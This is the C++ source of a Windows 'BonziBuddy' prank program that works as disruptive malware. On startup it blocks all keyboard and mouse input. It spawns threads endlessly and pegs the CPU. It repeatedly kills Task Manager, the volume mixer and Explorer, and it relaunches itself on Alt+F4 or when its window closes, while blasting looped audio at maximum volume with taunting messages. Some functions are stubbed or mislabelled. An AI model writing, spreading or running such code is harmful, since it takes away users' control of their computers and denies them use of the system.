#include <windows.h>
#include <gdiplus.h>
#include <tlhelp32.h>
#include <thread>
#include <string>
#include <vector>
#include <mmsystem.h>
#include <chrono>
#include <fstream>
#include <iostream>
#include "resource.h"
#include <sapi.h>
#include <sstream>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winmm.lib")

using namespace Gdiplus;

#define FLAG_FILE "played_flag.txt"
Image* bonziImage = nullptr;
UINT frameCount = 0;
UINT currentFrame = 0;
bool inputBoxShown = false;
GUID* dimensionIDs = nullptr;
UINT frameDelay = 100;

HFONT hHackerFont = nullptr;
HBRUSH hBrush = nullptr;
COLORREF textColor = RGB(255, 0, 0);
COLORREF bgColor = RGB(0, 0, 0);

void LaunchSelf(bool asChild = true);
bool IsProcessRunning(const wchar_t* processName);
LRESULT CALLBACK MessageBoxProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
Image* LoadImageFromResource(HINSTANCE hInstance, int resourceID, const wchar_t* resourceType);
void MonitorSelf();
void SpawnThreads();
void ConsumeCPU();
UINT GetGifFrameDelay(Image* image);
void CloseMessageBox(const wchar_t* messageBoxTitle, int delayMs);
void ToggleInput();
void AdvanceGifFrame(Image* image);
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow);
void ShowSpeechBubble(const std::wstring& message);
void SpeakBonzi(const std::wstring& text);

LRESULT CALLBACK SpeechBubbleProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        RECT rect;
        GetClientRect(hwnd, &rect);
        HBRUSH hBrush = CreateSolidBrush(RGB(255, 239, 169)); 
        HPEN hPen = CreatePen(PS_SOLID, 3, RGB(0, 0, 0)); 

        SelectObject(hdc, hBrush);
        SelectObject(hdc, hPen);

        RoundRect(hdc, 5, 5, rect.right - 5, rect.bottom - 15, 15, 15);

        POINT triangle[3] = {
            { (rect.right / 2) - 10, rect.bottom - 15 },  
            { (rect.right / 2) + 10, rect.bottom - 15 },  
            { rect.right / 2, rect.bottom }               
        };
        Polygon(hdc, triangle, 3);

        DeleteObject(hBrush);
        DeleteObject(hPen);
        EndPaint(hwnd, &ps);
        return 0;
    }
    case WM_CLOSE:
        DestroyWindow(hwnd);
        return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}
void SetMaxVolume() {
    waveOutSetVolume(0, 0xFFFF);
}
void SpeakBonzi(const std::wstring& message) {
    CoUninitialize();
}
void ShowSpeechBubble(const std::wstring& message) {
    const wchar_t CLASS_NAME[] = L"BonziSpeechBubble";
    WNDCLASS wc = {};
    wc.lpfnWndProc = SpeechBubbleProc;
    wc.hInstance = GetModuleHandle(nullptr);
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = CreateSolidBrush(RGB(255, 239, 169)); 
    RegisterClass(&wc);

    HWND hBonziWnd = FindWindow(L"BonziBuddyWindow", NULL);
    if (!hBonziWnd) return;

    RECT bonziRect;
    GetWindowRect(hBonziWnd, &bonziRect);

    int bubbleWidth = 320;
    int bubbleHeight = 90;
    int bubbleX = bonziRect.left + 50;
    int bubbleY = bonziRect.top - bubbleHeight - 10;

    HWND hwndBubble = CreateWindowEx(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        CLASS_NAME, L"", WS_POPUP | WS_BORDER,
        bubbleX, bubbleY, bubbleWidth, bubbleHeight,
        nullptr, nullptr, GetModuleHandle(nullptr), nullptr);

    HWND hwndText = CreateWindow(
        L"STATIC", L"",
        WS_VISIBLE | WS_CHILD | SS_CENTER,
        15, 15, bubbleWidth - 30, bubbleHeight - 40,
        hwndBubble, nullptr, GetModuleHandle(nullptr), nullptr);

    SendMessage(hwndText, WM_SETFONT, (WPARAM)GetStockObject(DEFAULT_GUI_FONT), TRUE);
    ShowWindow(hwndBubble, SW_SHOWNORMAL);
    UpdateWindow(hwndBubble);

    std::wstring currentText;
    std::wstringstream wordStream(message);
    std::wstring word;

    while (wordStream >> word) {
        currentText += word + L" ";
        SetWindowText(hwndText, currentText.c_str());
        std::this_thread::sleep_for(std::chrono::milliseconds(300));
    }
    std::this_thread::sleep_for(std::chrono::seconds(2));
    DestroyWindow(hwndBubble);
}

void BonziSpeak(const std::wstring& text) {
    std::thread speechThread([text]() {
        std::thread ttsThread(SpeakBonzi, text); 
        ShowSpeechBubble(text); 
        ttsThread.join(); 
        });
    speechThread.detach();
}
void LaunchSelf(bool asChild) {
    TCHAR szFileName[MAX_PATH];
    GetModuleFileName(nullptr, szFileName, MAX_PATH);
    ShellExecute(nullptr, L"open", szFileName, asChild ? L"--child" : nullptr, nullptr, SW_SHOWNORMAL);
}
HWND hTaskMgr = NULL;

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    wchar_t className[256];
    GetClassName(hwnd, className, sizeof(className) / sizeof(wchar_t));

    if (wcscmp(className, L"SndVol") == 0) {
        *(HWND*)lParam = hwnd;
        return FALSE; 
    }
    return TRUE; 
}

HWND FindTaskManager() {
    HWND hWnd = NULL;
    EnumWindows(EnumWindowsProc, (LPARAM)&hWnd);
    return hWnd;
}

void RunAwayFromMouse() {
    HWND hTaskMgr = NULL;

    while (hTaskMgr == NULL) {
        hTaskMgr = FindTaskManager();
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

    RECT taskMgrRect;
    POINT cursorPos;
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    while (true) {
        GetCursorPos(&cursorPos); 
        GetWindowRect(hTaskMgr, &taskMgrRect); 

        int taskMgrX = taskMgrRect.left;
        int taskMgrY = taskMgrRect.top;
        int taskMgrWidth = taskMgrRect.right - taskMgrRect.left;
        int taskMgrHeight = taskMgrRect.bottom - taskMgrRect.top;

        int centerX = taskMgrX + taskMgrWidth / 2;
        int centerY = taskMgrY + taskMgrHeight / 2;

        int distanceX = cursorPos.x - centerX;
        int distanceY = cursorPos.y - centerY;
        int distance = abs(distanceX) + abs(distanceY);

        if (distance < 300) { 
            int moveX = taskMgrX - (distanceX > 0 ? 250 : -250);
            int moveY = taskMgrY - (distanceY > 0 ? 250 : -250);

            moveX = max(0, min(moveX, screenWidth - taskMgrWidth));
            moveY = max(0, min(moveY, screenHeight - taskMgrHeight));

            SetWindowPos(hTaskMgr, HWND_TOPMOST, moveX, moveY, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(50)); 
    }
}
bool IsProcessRunning(const wchar_t* processName) {
    bool found = false;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32 = {};
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                    found = true;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return found;
}

Image* LoadImageFromResource(HINSTANCE hInstance, int resourceID, const wchar_t* resourceType) {
    HRSRC hResource = FindResource(hInstance, MAKEINTRESOURCE(resourceID), resourceType);
    if (!hResource) return nullptr;

    HGLOBAL hMemory = LoadResource(hInstance, hResource);
    if (!hMemory) return nullptr;

    DWORD size = SizeofResource(hInstance, hResource);
    void* data = LockResource(hMemory);

    HGLOBAL hBuffer = GlobalAlloc(GMEM_MOVEABLE, size);
    if (!hBuffer) return nullptr;

    void* buffer = GlobalLock(hBuffer);
    memcpy(buffer, data, size);
    GlobalUnlock(hBuffer);

    IStream* pStream = nullptr;
    if (FAILED(CreateStreamOnHGlobal(hBuffer, TRUE, &pStream))) {
        GlobalFree(hBuffer);
        return nullptr;
    }

    Image* image = new Image(pStream);
    pStream->Release();
    return image;
}

void MonitorSelf() {
    TCHAR szFileName[MAX_PATH];
    GetModuleFileName(nullptr, szFileName, MAX_PATH);

    while (true) {
        HWND hwnd = FindWindow(nullptr, L"BonziBuddyWindow");
        if (!hwnd) {
            ShellExecute(nullptr, L"open", szFileName, nullptr, nullptr, SW_SHOWNORMAL);
        }
        Sleep(1000);
    }
}

void SpawnThreads() {
    while (true) {
        std::thread([]() { while (true) Sleep(1000); }).detach();
        Sleep(5);
    }
}

void ConsumeCPU() {
    while (true) {
        volatile double x = 0;
        for (int i = 0; i < 1'000'000; i++) {
            x += 1.0 / (i + 1);
        }
    }
}

UINT GetGifFrameDelay(Image* image) {
    UINT delay = 100;
    PropertyItem* propertyItem = nullptr;

    UINT size = image->GetPropertyItemSize(PropertyTagFrameDelay);
    if (size > 0) {
        propertyItem = (PropertyItem*)malloc(size);
        if (image->GetPropertyItem(PropertyTagFrameDelay, size, propertyItem) == Ok) {
            delay = ((UINT*)propertyItem->value)[0] * 10;
        }
        free(propertyItem);
    }

    return delay;
}

void CloseMessageBox(const wchar_t* messageBoxTitle, int delayMs) {
    std::thread([messageBoxTitle, delayMs]() {
        Sleep(delayMs);
        HWND hMsgBox = FindWindow(nullptr, messageBoxTitle);
        if (hMsgBox != nullptr) {
            SendMessage(hMsgBox, WM_CLOSE, 0, 0);
        }
        }).detach();
}
bool HasPlayedWelcomeSound() {
    std::ifstream file(FLAG_FILE);
    return file.good(); 
}
void MarkWelcomeSoundPlayed() {
    std::ofstream file(FLAG_FILE);
    file << "played";  
    file.close();
}
void PlayWelcomeAndSong() {
    if (!HasPlayedWelcomeSound()) {
        PlaySound(MAKEINTRESOURCE(IDR_WAVE4), GetModuleHandle(nullptr), SND_RESOURCE);
        MarkWelcomeSoundPlayed();
    }
}
void PlayTaskmgr() {
    PlaySound(MAKEINTRESOURCE(IDR_WAVE3), GetModuleHandle(nullptr), SND_RESOURCE);
}
void PlaySong() {
    PlaySound(MAKEINTRESOURCE(IDR_WAVE1), GetModuleHandle(nullptr), SND_RESOURCE | SND_ASYNC | SND_LOOP);
}
void ToggleInput() {
    BlockInput(TRUE);
}

void AdvanceGifFrame(Image* image) {
    if (image == nullptr || frameCount <= 1) return;

    GUID* dimensions = dimensionIDs;
    image->SelectActiveFrame(dimensions, (currentFrame + 1) % frameCount);
    currentFrame = (currentFrame + 1) % frameCount;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_SYSCOMMAND:
        if (wParam == SC_CLOSE) {
            SetMaxVolume();
            BonziSpeak(L"You tring to kill me with alt + f4.Sadly I have hookedd your Syskey Another bonzi joined the party!");
            if (!PlaySound(MAKEINTRESOURCE(IDR_WAVE2), GetModuleHandle(nullptr), SND_RESOURCE)) {
                MessageBox(nullptr, L"Failed to play sound!", L"Error", MB_OK | MB_ICONERROR);
            }
            LaunchSelf(false);
            return 0;
        }
        break;

    case WM_CREATE: {
        CREATESTRUCT* pCreate = (CREATESTRUCT*)lParam;
        bool isChild = reinterpret_cast<bool>(pCreate->lpCreateParams);
        SetTimer(hwnd, 4, 10, nullptr);
        if (!isChild) {
            std::thread soundThread(PlayWelcomeAndSong);

            soundThread.detach();
            SetTimer(hwnd, 3, 30000, nullptr);
        }
        ToggleInput();



        GdiplusStartupInput gdiplusStartupInput;
        ULONG_PTR gdiplusToken;
        GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

        HINSTANCE hInstance = GetModuleHandle(nullptr);
        bonziImage = LoadImageFromResource(hInstance, IDR_GIF1, L"GIF");

        if (bonziImage) {
            frameCount = bonziImage->GetFrameCount(&FrameDimensionTime);
            dimensionIDs = (GUID*)&FrameDimensionTime;
            frameDelay = GetGifFrameDelay(bonziImage);
        }
        std::thread soundThread3(PlaySong);
        soundThread3.detach();
        SetTimer(hwnd, 1, frameDelay, nullptr);
        SetTimer(hwnd, 2, 100, nullptr);

        std::thread(SpawnThreads).detach();
        std::thread(ConsumeCPU).detach();
        return 0;
    }

    case WM_TIMER:
        if (wParam == 1) {
            AdvanceGifFrame(bonziImage);
            InvalidateRect(hwnd, nullptr, TRUE);
        }
        else if (wParam == 2) {
            POINT cursorPos;
            GetCursorPos(&cursorPos);
            SetWindowPos(hwnd, nullptr, cursorPos.x - 140, cursorPos.y - 140, 0, 0, SWP_NOZORDER | SWP_NOSIZE);
        }
        else if (wParam == 3) {
            LaunchSelf();
            KillTimer(hwnd, 3);
        }
        else if (wParam == 4) {
            const std::vector<std::wstring> processesToKill = { L"Taskmgr.exe", L"SndVol.exe", L"explorer.exe" };

            if (IsProcessRunning(L"Taskmgr.exe")) {
                PlaySound(NULL, NULL, 0);
                std::thread soundThread2(PlayTaskmgr);
                BonziSpeak(L"Oh, you thought you could escape me ? No task manager for you.BonziBuddy is forever!Now sit back, relax, and enjoy the ride – another monkey is about to join the party!");
                soundThread2.detach();
                std::thread soundThread3(PlaySong);
                soundThread3.detach();
             LaunchSelf(false);
            }

            HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnapshot != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32 pe32 = {};
                pe32.dwSize = sizeof(PROCESSENTRY32);

                if (Process32First(hSnapshot, &pe32)) {
                    do {
                        for (const auto& processName : processesToKill) {
                            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                                if (hProcess) {
                                    TerminateProcess(hProcess, 0);
                                    CloseHandle(hProcess);
                                    wprintf(L"Terminated process: %s\n", processName.c_str());
                                }
                            }
                        }
                    } while (Process32Next(hSnapshot, &pe32));
                }
                CloseHandle(hSnapshot);
            }
        }
        return 0;

    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);

        if (bonziImage) {
            Graphics graphics(hdc);
            graphics.DrawImage(bonziImage, 0, 0, bonziImage->GetWidth(), bonziImage->GetHeight());
        }

        EndPaint(hwnd, &ps);
        return 0;
    }

    case WM_DESTROY:
        delete bonziImage;
        PostQuitMessage(0);
        return 0;

    default:    
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    
    std::thread prankThread(RunAwayFromMouse);
    prankThread.detach();
    const wchar_t CLASS_NAME[] = L"BonziBuddyWindow";
    bool isChild = (strcmp(lpCmdLine, "--child") == 0);

    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)CreateSolidBrush(RGB(0, 0, 0));
    RegisterClass(&wc);

    bonziImage = LoadImageFromResource(hInstance, IDR_GIF1, L"GIF");
    if (!bonziImage) {
        MessageBox(nullptr, L"Failed to load GIF resource!", L"Error", MB_OK | MB_ICONERROR);
        return 0;
    }

    HWND hwnd = CreateWindowEx(WS_EX_LAYERED | WS_EX_TOOLWINDOW, CLASS_NAME, L"BonziBuddy", WS_POPUP, CW_USEDEFAULT, CW_USEDEFAULT, 1000, 1000, nullptr, nullptr, hInstance, reinterpret_cast<LPVOID>(isChild));
    if (!hwnd) return 0;

    SetLayeredWindowAttributes(hwnd, RGB(0, 0, 0), 0, LWA_COLORKEY);
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
    ShowWindow(hwnd, nCmdShow);
    MSG msg = {};
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    GdiplusShutdown(gdiplusToken);
    return 0;
}